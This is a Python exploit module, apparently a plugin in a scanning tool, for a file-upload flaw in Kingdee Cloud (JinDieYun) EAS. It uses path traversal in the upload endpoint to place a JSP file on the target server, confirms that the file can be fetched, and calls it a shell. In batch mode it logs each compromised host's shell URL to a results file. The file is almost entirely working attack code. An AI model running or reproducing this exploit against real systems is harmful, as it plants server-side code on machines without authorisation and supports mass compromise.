import requests
import urllib3
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
urllib3.disable_warnings()

class JindieYunShellScan:
    def main(self,target):
        self.batch = target["batch_work"]
        urls = target['url'].strip("/ ")
        header = target["header"]
        proxy = target["proxy"]
        ssl = target["ssl"]
        ders, proxys = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("JinDieYun", "开始检测漏洞...")
        headers = {
            "Host": urls.split("://")[-1],
            "Cache-Control": "max-age=0",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "zh-CN,zh;q=0.9",
            "Connection": "close",
            "Content-Length": "205"
        }
        file = {"myFile":("testchesk.jsp",'<%out.println("test");%>',"text/html")}
        url = f"{urls}/easportal/buffalo/%2e%2e/cm/myUploadFile.do"
        try:
            response = requests.post(url,verify=ssl,files=file,headers=headers,proxies=proxys)
            url2 = f"{urls}/testchesk.jsp"
            response2 = requests.get(url2,verify=ssl,headers={"User-Agent": header},proxies=proxys)
            if response2.status_code == 200 and response2.url == url2:
                if not self.batch:
                    OutPrintInfoSuc("JinDieYun", f"存在漏洞 {url}")
                    OutPrintInfo("JinDieYun", f"[b bright_red]Shell {url2}")
                else:
                    OutPrintInfoSuc("JinDieYun", f"存在漏洞Shell: {url2}")
                    with open("./result/jindieyun_shell.txt","a") as w:
                        w.write(f"{url2}\n")
            else:
                if not self.batch:
                    OutPrintInfo("JinDieYun", "不存在漏洞")
        except Exception:
            if not self.batch:
                OutPrintInfo("JinDieYun", "不存在漏洞")
        if not self.batch:
            OutPrintInfo("JinDieYun", "漏洞检测结束")


